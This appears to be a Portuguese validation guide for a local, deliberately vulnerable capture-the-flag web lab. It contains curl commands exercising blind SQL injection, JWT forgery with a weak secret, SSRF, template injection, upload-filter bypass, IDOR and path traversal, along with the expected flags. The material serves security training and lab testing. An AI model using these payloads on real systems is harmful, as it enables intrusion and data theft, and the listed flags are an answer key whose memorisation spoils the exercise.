# Validation — Lab 2 — NeonVault: Cyber Identity Breach

Documento técnico para validar o Lab 2 localmente.

## Escopo

Validar apenas:

```text
lab-02-neonvault
```

Não alterar durante a validação:

- `lab-01-minibank`
- README raiz
- VALIDATION raiz
- portas principais do Lab 2
- nomes das flags

## Pré-requisitos

- Docker
- Docker Compose
- `curl`
- `grep`
- Shell Bash para o script automatizado

Não é necessário ter `npm` instalado no host.

## Subir com Docker

```bash
cd ~/ctf-labs/lab-02-neonvault
docker compose up --build
```

Em outro terminal, confirme o container:

```bash
docker compose ps
```

Para parar:

```bash
docker compose down
```

## Validação automatizada

Com o container rodando:

```bash
cd ~/ctf-labs/lab-02-neonvault
bash scripts/validate.sh
```

O script assume `http://127.0.0.1:8092`, realiza login com `nova / nova2099`, testa rotas autenticadas e exercita evidências das oito vulnerabilidades.

Resultado esperado:

```text
Resultado: 34 OK, 0 FAIL
```

## Validar portas

```bash
docker compose config | grep -E 'host_ip|published|INTERNAL_PORT'
docker compose config | grep -q 'published: "5000"' && echo "FAIL: porta 5000 publicada" || echo "OK: porta 5000 não publicada"
```

Esperado:

- `8092` publicado em `127.0.0.1`
- `5000` presente apenas como `INTERNAL_PORT`
- nenhuma publicação de `5000` no host

## Rotas basicas

```bash
curl -i http://127.0.0.1:8092/
curl -i http://127.0.0.1:8092/login
curl -i http://127.0.0.1:8092/recover
curl -i http://127.0.0.1:8092/download
```

Esperado:

- `/` retorna `200`
- `/login` retorna `200`
- `/recover` retorna `200`
- `/download` retorna página do downloader

## Login e cookie

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8092/login \
  -d "username=nova" \
  -d "password=nova2099"
```

Esperado:

- resposta `302`
- cookie `neon_token`
- redirecionamento para `/dashboard`

Rotas autenticadas:

```bash
curl -i -b cookies.txt http://127.0.0.1:8092/dashboard
curl -i -b cookies.txt http://127.0.0.1:8092/profile
curl -i -b cookies.txt http://127.0.0.1:8092/logs
curl -i -b cookies.txt http://127.0.0.1:8092/files
curl -i -b cookies.txt http://127.0.0.1:8092/messages/preview
curl -i -b cookies.txt http://127.0.0.1:8092/avatar
curl -i -b cookies.txt http://127.0.0.1:8092/tools/webhook
```

## 1. Time-Based Blind SQL Injection

Login deve rejeitar SQLi basica:

```bash
curl -i -X POST http://127.0.0.1:8092/login \
  -d "username=admin' OR '1'='1'--" \
  -d "password=x"
```

Endpoint normal:

```bash
curl -sG http://127.0.0.1:8092/api/check-user --data-urlencode "username=nova"
curl -sG http://127.0.0.1:8092/api/check-user --data-urlencode "username=ghost"
```

Delay verdadeiro:

```bash
time curl -sG http://127.0.0.1:8092/api/check-user \
  --data-urlencode "username=admin' AND IF(SUBSTR(recovery_code,1,1)='N',SLEEP(2),0)-- "
```

Delay falso:

```bash
time curl -sG http://127.0.0.1:8092/api/check-user \
  --data-urlencode "username=admin' AND IF(SUBSTR(recovery_code,1,1)='X',SLEEP(2),0)-- "
```

Flag via recover:

```bash
curl -i -X POST http://127.0.0.1:8092/recover \
  -d "username=admin" \
  -d "recovery_code=N3ON"
```

Esperado:

```text
FLAG{blind_sqli_extracted_admin}
```

## 2. JWT Weak Secret / Token Forgery

Usuário comum deve ser bloqueado:

```bash
curl -i -b cookies.txt http://127.0.0.1:8092/admin/core
```

Gerar JWT admin via Docker:

```bash
TOKEN=$(docker compose exec -T neonvault node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({sub:2,username:'nova',displayName:'Nova Tanaka',role:'admin'}, 'neon'))")
curl -i -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8092/admin/core
```

Esperado:

```text
FLAG{jwt_forged_neon_admin}
```

## 3. SSRF em Webhook Tester

Status interno:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/tools/webhook \
  -d "url=http://127.0.0.1:5000/internal/status"
```

Flag interna:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/tools/webhook \
  -d "url=http://127.0.0.1:5000/internal/flag"
```

Esperado:

```text
FLAG{ssrf_internal_neon_service}
```

## 4. SSTI em Messages Preview

Prova aritmetica:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/messages/preview \
  -d "template={{7*7}}"
```

Esperado: `49`.

Segredo do contexto:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/messages/preview \
  -d "template={{vault.sstiSecret}}"
```

Esperado:

```text
FLAG{ssti_template_breach}
```

## 5. File Upload Bypass

Upload normal:

```bash
printf 'fake image' > /tmp/avatar.png
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/avatar \
  -F "avatar=@/tmp/avatar.png;filename=avatar.png"
```

Upload inválido simples:

```bash
printf 'not allowed' > /tmp/payload.exe
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/avatar \
  -F "avatar=@/tmp/payload.exe;filename=payload.exe"
```

Bypass:

```bash
printf '<h1>NEON_UPLOAD_PROBE</h1>' > /tmp/badge.html
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/avatar \
  -F "avatar=@/tmp/badge.html;filename=badge.html"
```

Esperado:

```text
FLAG{upload_filter_bypass}
```

## 6. SQL Injection em filtro de logs

Fluxo normal:

```bash
curl -i -b cookies.txt "http://127.0.0.1:8092/logs?level=error"
```

O fluxo normal não deve revelar a flag oculta.

Filtro injetado:

```bash
curl -i -b cookies.txt -G http://127.0.0.1:8092/logs \
  --data-urlencode "level=error' OR '1'='1'-- "
```

Esperado:

```text
FLAG{logs_filter_sqli}
```

## 7. IDOR em API de tickets

Ticket comum:

```bash
curl -i -b cookies.txt http://127.0.0.1:8092/api/tickets/101
```

Ticket administrativo:

```bash
curl -i -b cookies.txt http://127.0.0.1:8092/api/tickets/777
```

Esperado:

```text
FLAG{api_idor_object_leak}
```

## 8. Path Traversal com logs e backup

Arquivo normal:

```bash
curl -i "http://127.0.0.1:8092/download?file=report.pdf"
```

Log por traversal:

```bash
curl -i "http://127.0.0.1:8092/download?file=../../var/log/neonvault/access.log"
```

Backup apontado pelo log:

```bash
curl -i "http://127.0.0.1:8092/download?file=../../backup/legacy-admin-notes.bak"
```

Esperado:

```text
FLAG{traversal_follow_the_logs}
```

## Validar flags esperadas

```bash
grep -Rho "FLAG[{][^}]*}" . | sort -u
```

Resultado esperado:

```text
FLAG{api_idor_object_leak}
FLAG{blind_sqli_extracted_admin}
FLAG{jwt_forged_neon_admin}
FLAG{logs_filter_sqli}
FLAG{ssrf_internal_neon_service}
FLAG{ssti_template_breach}
FLAG{traversal_follow_the_logs}
FLAG{upload_filter_bypass}
```

## Validar README sem flags

```bash
grep -n "FLAG{" README.md && echo "FAIL" || echo "OK: README sem flags"
```

## Garantir que o Lab 1 não foi alterado

No repositorio raiz:

```bash
cd ~/ctf-labs
git diff --name-only -- lab-01-minibank
```

O comando não deve listar arquivos.

## Troubleshooting

Porta `8092` em uso:

```bash
docker compose down
docker compose ps
```

Ver logs:

```bash
docker compose logs -f
```

Rebuild limpo:

```bash
docker compose down
docker compose up --build
```

Se quiser remover volumes anonimos ou estado antigo de containers:

```bash
docker compose down -v
```

Erro de permissão Docker:

- confirme que seu usuário tem acesso ao Docker
- ou rode os comandos conforme o padrão do seu ambiente local

## Checklist final de aceite

- [ ] `docker compose up --build` sobe sem erro
- [ ] `/` responde `200`
- [ ] `/login` responde `200`
- [ ] login `nova / nova2099` retorna cookie JWT
- [ ] rotas autenticadas respondem com cookie
- [ ] `bash scripts/validate.sh` retorna `34 OK, 0 FAIL`
- [ ] porta `5000` não está publicada
- [ ] README não contém flags
- [ ] Blind SQLi revela a flag esperada
- [ ] JWT forjado revela a flag esperada
- [ ] SSRF revela a flag esperada
- [ ] SSTI revela a flag esperada
- [ ] Upload bypass revela a flag esperada
- [ ] Logs SQLi revela a flag esperada
- [ ] API IDOR revela a flag esperada
- [ ] Path Traversal revela a flag esperada
- [ ] `backup/` continua no singular
- [ ] `git diff --name-only -- lab-01-minibank` não lista arquivos
